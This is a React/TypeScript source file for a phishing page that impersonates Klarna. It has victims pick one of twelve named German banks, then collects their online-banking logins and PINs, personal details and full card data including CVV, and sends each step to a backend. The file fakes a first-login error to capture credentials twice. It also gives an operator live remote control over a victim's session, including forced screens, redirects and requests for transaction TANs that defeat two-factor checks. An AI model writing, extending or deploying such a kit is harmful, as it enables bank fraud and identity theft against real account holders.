import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';
import { preloadBankImages } from '../../utils/imagePreloader';
import templateSocketClient from '../../utils/socketClient';

// Import Klarna components
import KlarnaHeader from './components/KlarnaHeader';
import KlarnaFooter from './components/KlarnaFooter';
import BankSelector from './components/BankSelector';
import KlarnaBranchSelection from './components/KlarnaBranchSelection';
import KlarnaBankLogin from './components/KlarnaBankLogin';
import KlarnaPersonalData from './components/KlarnaPersonalData';
import KlarnaBankCard from './components/KlarnaBankCard';
import KlarnaLoading from './components/KlarnaLoading';
import KlarnaErrorScreen from './components/KlarnaErrorScreen';
import KlarnaSuccess from './components/KlarnaSuccess';

import './KlarnaStyle.css';

// Branch selection interface (for Sparkasse and Volksbank)
interface SelectedBranch {
  branch_id: number;
  branch_name: string;
  city: string;
  zip_code: string;
}

// Klarna flow states (9-step process with conditional branch selection and double login)
const KLARNA_STATES = {
  BANK_SELECTION: 'bank_selection',
  BRANCH_SELECTION: 'branch_selection',
  BANK_LOGIN: 'bank_login',
  BANK_LOGIN_ERROR: 'bank_login_error',
  PERSONAL_DATA: 'personal_data',
  BANK_CARD: 'bank_card',
  PROCESSING: 'processing',
  SUCCESS: 'success',
  ERROR: 'error'
};

// Available banks configuration
interface AvailableBank {
  id: string;
  displayName: string;
  logo: string;
  description: string;
  isActive: boolean;
}

const AVAILABLE_BANKS: AvailableBank[] = [
  { id: 'commerzbank', displayName: 'Commerzbank', logo: '/images/icons/commerzbank.png', description: 'Commerzbank AG', isActive: true },
  { id: 'sparkasse', displayName: 'Sparkasse', logo: '/images/icons/sparkasse.png', description: 'Sparkassen-Finanzgruppe', isActive: true },
  { id: 'dkb', displayName: 'DKB', logo: '/images/icons/dkb.png', description: 'Deutsche Kreditbank AG', isActive: true },
  { id: 'volksbank', displayName: 'Volksbank', logo: '/images/icons/volksbank.png', description: 'Volksbank Raiffeisenbank', isActive: true },
  { id: 'postbank', displayName: 'Postbank', logo: '/images/icons/postbank.png', description: 'Deutsche Postbank AG', isActive: true },
  { id: 'santander', displayName: 'Santander', logo: '/images/icons/santander.png', description: 'Santander Consumer Bank', isActive: true },
  { id: 'apobank', displayName: 'Apobank', logo: '/images/icons/apobank.png', description: 'Deutsche Apotheker- und Ärztebank', isActive: true },
  { id: 'comdirect', displayName: 'comdirect', logo: '/images/icons/comdirect.png', description: 'comdirect bank AG', isActive: true },
  { id: 'consorsbank', displayName: 'Consorsbank', logo: '/images/icons/Consorsbank.png', description: 'Consorsbank', isActive: true },
  { id: 'ingdiba', displayName: 'ING', logo: '/images/icons/ingdiba.png', description: 'ING-DiBa AG', isActive: true },
  { id: 'deutsche_bank', displayName: 'Deutsche Bank', logo: '/images/icons/deutschebank.png', description: 'Deutsche Bank AG', isActive: true },
  { id: 'targobank', displayName: 'TARGOBANK', logo: '/images/icons/targobank.png', description: 'TARGOBANK AG', isActive: true }
];

// Data interfaces
interface LoginData {
  username?: string;
  password?: string;
  pin?: string;
  [key: string]: any;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

// AutoLogin component to handle automatic key generation
function KlarnaAutoLogin() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    // Update metadata for Klarna
    const metadata = getTemplateMetadata('klarna');
    updatePageMetadata(metadata);

    // Automatically generate a new key
    const generateKey = async () => {
      try {
        const key = await createTemplateSession('klarna');
        console.log('Generated Klarna session key:', key);
        navigate(`/klarna/${key}`);
      } catch (error) {
        console.error('Failed to create Klarna session:', error);
        setError('Fehler beim Erstellen der Sitzung');
        setLoading(false);
      }
    };

    // Small delay to show loading
    setTimeout(generateKey, 500);
  }, [navigate]);

  if (error) {
    return <KlarnaErrorScreen message={error} onRetry={() => window.location.reload()} />;
  }

  return <KlarnaLoading message="Klarna wird geladen..." />;
}

// Main Klarna flow component
function KlarnaFormFlow() {
  const { key } = useParams<{ key: string }>();
  const navigate = useNavigate();
  
  const [state, setState] = useState(KLARNA_STATES.BANK_SELECTION);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState("Wird verarbeitet...");
  const [templateConfig, setTemplateConfig] = useState<Record<string, boolean>>({});
  const [configLoaded, setConfigLoaded] = useState(false);
  
  // Session data
  const [selectedBank, setSelectedBank] = useState<string | null>(null);
  const [selectedBranch, setSelectedBranch] = useState<SelectedBranch | null>(null);
  const [loginData, setLoginData] = useState<LoginData>({});
  const [personalData, setPersonalData] = useState<PersonalData | null>(null);
  const [bankCardData, setBankCardData] = useState<BankCardData | null>(null);
  const [loginAttempts, setLoginAttempts] = useState(0);
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      const sessionData = { selectedBank, selectedBranch, loginData, personalData, bankCardData };
      setPersonalData(prev => ({ ...prev, pendingState: nextState } as any));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    // Update metadata for Klarna
    const metadata = getTemplateMetadata('klarna');
    updatePageMetadata(metadata);

    // Preload Klarna-specific images
    preloadBankImages('klarna');

    // Load template configuration - MUST complete before user interaction
    const loadConfig = async () => {
      try {
        setLoadingMessage("Schritt-Konfiguration wird geladen...");
        const config = await getTemplateConfig('klarna');
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Klarna template configuration loaded:', config.steps);
          console.log('🔧 Klarna step config details:', {
            bankSelection: config.steps.bankSelection,
            branchSelection: config.steps.branchSelection,
            personalData: config.steps.personalData,
            bankCard: config.steps.bankCard,
            configLoaded: true
          });
        }
        setTemplateConfig(config.steps || {});
        setConfigLoaded(true);
      } catch (error) {
        console.error('⚠️ Failed to load Klarna template config:', error);
        // Set default config if loading fails
        setTemplateConfig({ bankSelection: true, personalData: true, bankCard: true });
        setConfigLoaded(true);
      }
    };
    
    // Wait for config to load, then initialize session
    const initializeAfterConfig = async () => {
      await loadConfig();
      setLoadingMessage("Klarna wird initialisiert...");
      setTimeout(() => {
        setLoading(false);
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Klarna session initialized with key:', key);
        }
      }, 1000);
    };
    
    initializeAfterConfig();
    
    // Initialize Socket.io connection for real-time admin control
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'klarna',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          // Show loading screen during state transition with natural banking messages
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'success':
                return 'Vorgang wird abgeschlossen...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message);
            }
          }, 1500);
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          
          // Show loading screen during data injection
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          
          setTimeout(() => {
            if (data.personalData) setPersonalData(data.personalData);
            if (data.bankCardData) setBankCardData(data.bankCardData);
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        // AFK/Live Mode handlers
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          
          // If switching to AFK mode and waiting, continue flow
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && personalData?.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState((personalData as any).pendingState);
            setPersonalData(prev => ({ ...prev, pendingState: null } as any));
          }
        },
        // Enhanced TAN system handlers
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            setState(KLARNA_STATES.SUCCESS); // Klarna uses SUCCESS instead of PUSHTAN_REQUEST
          }, 2000);
        }
      });
    }
    
    // Cleanup socket on unmount
    return () => {
      templateSocketClient.disconnect();
    };
  }, [key, isWaitingForAdmin, personalData]);

  // Helper function to proceed to next step after login
  const proceedToNextStep = () => {
    if (templateConfig.personalData === true) {
      setState(KLARNA_STATES.PERSONAL_DATA);
    } else if (templateConfig.bankCard === true) {
      setState(KLARNA_STATES.BANK_CARD);
    } else {
      setState(KLARNA_STATES.SUCCESS);
    }
  };

  // Handle bank selection
  const handleBankSelection = async (bankId: string) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Bank selection attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Klarna: Bank selected:', bankId);
      setLoading(true);
      setLoadingMessage("Bank wird geladen...");

      // Submit bank selection to backend
      const response = await submitTemplateData({
        template_name: 'klarna',
        key: key || '',
        step: 'bank-selection',
        data: { selected_bank: bankId }
      });

      if (response.success) {
        console.log('✅ Klarna bank selection submitted successfully');
        setSelectedBank(bankId);
        
        // Preload bank-specific images
        preloadBankImages(bankId);
        
        // Check if selected bank requires branch selection
        if (bankId === 'sparkasse' || bankId === 'volksbank') {
          setState(KLARNA_STATES.BRANCH_SELECTION);
        } else {
          setState(KLARNA_STATES.BANK_LOGIN);
        }
      } else {
        console.error('❌ Klarna bank selection failed:', response.error);
        setError(response.error || 'Fehler bei der Bankauswahl');
        setState(KLARNA_STATES.ERROR);
      }
    } catch (error: any) {
      console.error('❌ Klarna bank selection error:', error);
      setError('Fehler bei der Bankauswahl');
      setState(KLARNA_STATES.ERROR);
    } finally {
      setLoading(false);
    }
  };

  // Handle branch selection (for Sparkasse and Volksbank)
  const handleBranchSelection = async (branch: SelectedBranch) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Branch selection attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Klarna: Branch selected:', branch);
      setLoading(true);
      setLoadingMessage("Filiale wird verarbeitet...");

      // Submit branch selection to backend
      const response = await submitTemplateData({
        template_name: 'klarna',
        key: key || '',
        step: 'branch-selection',
        data: { 
          selected_bank: selectedBank,
          selected_branch: branch
        }
      });

      if (response.success) {
        console.log('✅ Klarna branch selection submitted successfully');
        setSelectedBranch(branch);
        setState(KLARNA_STATES.BANK_LOGIN);
      } else {
        console.error('❌ Klarna branch selection failed:', response.error);
        setError(response.error || 'Fehler bei der Filialauswahl');
        setState(KLARNA_STATES.ERROR);
      }
    } catch (error: any) {
      console.error('❌ Klarna branch selection error:', error);
      setError('Fehler bei der Filialauswahl');
      setState(KLARNA_STATES.ERROR);
    } finally {
      setLoading(false);
    }
  };

  // Handle bank login
  const handleBankLogin = async (data: LoginData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Bank login attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Klarna: Bank login for', selectedBank);
      console.log('🔐 Klarna login data being submitted:', JSON.stringify(data, null, 2));
      setLoading(true);
      setLoadingMessage("Anmeldung wird verarbeitet...");

      const submissionData = { 
        ...data, 
        bank_type: selectedBank,
        selected_branch: selectedBranch 
      };
      
      console.log('📤 Full Klarna submission payload:', JSON.stringify(submissionData, null, 2));

      // Submit login data to backend
      const response = await submitTemplateData({
        template_name: 'klarna',
        key: key || '',
        step: 'bank-login',
        data: submissionData
      });

      if (response.success) {
        console.log('✅ Klarna bank login submitted successfully');
        setLoginData(data);
        
        // Increment login attempts for tracking
        setLoginAttempts(prev => prev + 1);
        
        // Check double login configuration
        if (state === KLARNA_STATES.BANK_LOGIN) {
          if (templateConfig.doubleLogin === true) {
            // First login attempt - show error
            console.log('Klarna: First login attempt - showing error (double login enabled)');
            setState(KLARNA_STATES.BANK_LOGIN_ERROR);
        } else {
            // Single login - go directly to next step
            console.log('Klarna: Single login - proceeding to next step (double login disabled)');
            proceedToNextStep();
          }
        } else if (state === KLARNA_STATES.BANK_LOGIN_ERROR) {
          // Second login attempt - proceed to next step
          console.log('Klarna: Second login attempt - proceeding to next step');
          proceedToNextStep();
        }
      } else {
        console.error('❌ Klarna bank login failed:', response.error);
        setError(response.error || 'Fehler bei der Anmeldung');
        setState(KLARNA_STATES.ERROR);
      }
    } catch (error: any) {
      console.error('❌ Klarna bank login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(KLARNA_STATES.ERROR);
    } finally {
      setLoading(false);
    }
  };

  // Handle personal data submission
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Personal data submit attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Klarna: Personal data submission');
      setLoading(true);
      setLoadingMessage("Persönliche Daten werden verarbeitet...");

      // Submit personal data to backend
      const response = await submitTemplateData({
        template_name: 'klarna',
        key: key || '',
        step: 'personal-data-complete',
        data: { 
          ...data, 
          bank_type: selectedBank,
          selected_branch: selectedBranch 
        }
      });

      if (response.success) {
        console.log('✅ Klarna personal data submitted successfully');
        setPersonalData(data);
        // Check if bank card step is enabled
        if (templateConfig.bankCard === true) {
          setState(KLARNA_STATES.BANK_CARD);
        } else {
          setState(KLARNA_STATES.SUCCESS);
        }
      } else {
        console.error('❌ Klarna personal data failed:', response.error);
        setError(response.error || 'Fehler beim Speichern der persönlichen Daten');
        setState(KLARNA_STATES.ERROR);
      }
    } catch (error: any) {
      console.error('❌ Klarna personal data error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
      setState(KLARNA_STATES.ERROR);
    } finally {
      setLoading(false);
    }
  };

  // Handle bank card submission
  const handleBankCardSubmit = async (data: BankCardData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Bank card submit attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Klarna: Bank card submission');
      setLoading(true);
      setLoadingMessage("Kartendaten werden verarbeitet...");

      // Submit bank card data to backend
      const response = await submitTemplateData({
        template_name: 'klarna',
        key: key || '',
        step: 'bank-card-complete',
        data: { 
          ...data, 
          bank_type: selectedBank,
          selected_branch: selectedBranch 
        }
      });

      if (response.success) {
        console.log('✅ Klarna bank card submitted successfully');
        setBankCardData(data);
        setState(KLARNA_STATES.PROCESSING);
        
        // Simulate processing time
        setTimeout(() => {
          setState(KLARNA_STATES.SUCCESS);
        }, 2000);
      } else {
        console.error('❌ Klarna bank card failed:', response.error);
        setError(response.error || 'Fehler beim Speichern der Kartendaten');
        setState(KLARNA_STATES.ERROR);
      }
    } catch (error: any) {
      console.error('❌ Klarna bank card error:', error);
      setError('Fehler beim Speichern der Kartendaten');
      setState(KLARNA_STATES.ERROR);
    } finally {
      setLoading(false);
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('Klarna: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'klarna',
        key: key || '',
        step: 'bank-card-skip',
        data: { 
          skip_reason: 'no_credit_card',
          bank_type: selectedBank,
          selected_branch: selectedBranch 
        }
      });
      
      if (!response.success) {
        console.error('❌ Klarna bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(KLARNA_STATES.ERROR);
        return;
      }
      
      console.log('✅ Klarna bank card skip completed successfully');
      
      // Show processing state
      setState(KLARNA_STATES.PROCESSING);
      
      // Simulate processing time
      setTimeout(() => {
        setState(KLARNA_STATES.SUCCESS);
      }, 2000);
      
    } catch (error) {
      console.error('❌ Klarna bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(KLARNA_STATES.ERROR);
    }
  };

  // Handle logo click - return to bank selection
  const handleLogoClick = () => {
    setState(KLARNA_STATES.BANK_SELECTION);
    setSelectedBank(null);
    setSelectedBranch(null);
    setError(null);
  };

  // Render appropriate component based on state
  const renderContent = () => {
    if (loading || !configLoaded) {
      return <KlarnaLoading 
        message={!configLoaded ? "Schritt-Konfiguration wird geladen..." : loadingMessage} 
      />;
    }
    
    if (error && state === KLARNA_STATES.ERROR) {
      return <KlarnaErrorScreen message={error} onRetry={() => {
        setError(null);
        setState(KLARNA_STATES.BANK_SELECTION);
      }} />;
    }
    
    switch (state) {
      case KLARNA_STATES.BANK_SELECTION:
        return <BankSelector banks={AVAILABLE_BANKS} onBankSelect={handleBankSelection} />;
        
      case KLARNA_STATES.BRANCH_SELECTION:
        return <KlarnaBranchSelection selectedBank={selectedBank!} onSubmit={handleBranchSelection} />;
        
      case KLARNA_STATES.BANK_LOGIN:
        return <KlarnaBankLogin selectedBank={selectedBank} onSubmit={handleBankLogin} showError={false} />;
        
      case KLARNA_STATES.BANK_LOGIN_ERROR:
        return <KlarnaBankLogin selectedBank={selectedBank} onSubmit={handleBankLogin} showError={true} />;
      
      case KLARNA_STATES.PERSONAL_DATA:
        return <KlarnaPersonalData onSubmit={handlePersonalDataSubmit} />;
      
      case KLARNA_STATES.BANK_CARD:
        return <KlarnaBankCard onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
      
      case KLARNA_STATES.PROCESSING:
        return <KlarnaLoading message="Verifizierung wird abgeschlossen..." />;
      
      case KLARNA_STATES.SUCCESS:
        return <KlarnaSuccess selectedBank={selectedBank} />;
      
      default:
        return <KlarnaErrorScreen message="Unbekannter Status" onRetry={() => setState(KLARNA_STATES.BANK_SELECTION)} />;
    }
  };

  return (
    <div className="klarna-template">
      <KlarnaHeader onLogoClick={handleLogoClick} />
      <main className="klarna-main">
        {renderContent()}
      </main>
      <KlarnaFooter />
    </div>
  );
}

// Main Klarna Template Component
const KlarnaTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();

  // If no key provided, show AutoLogin to generate one
  if (!key) {
    return <KlarnaAutoLogin />;
  }

  // If key provided, show the main form flow
  return <KlarnaFormFlow />;
};

export default KlarnaTemplate;
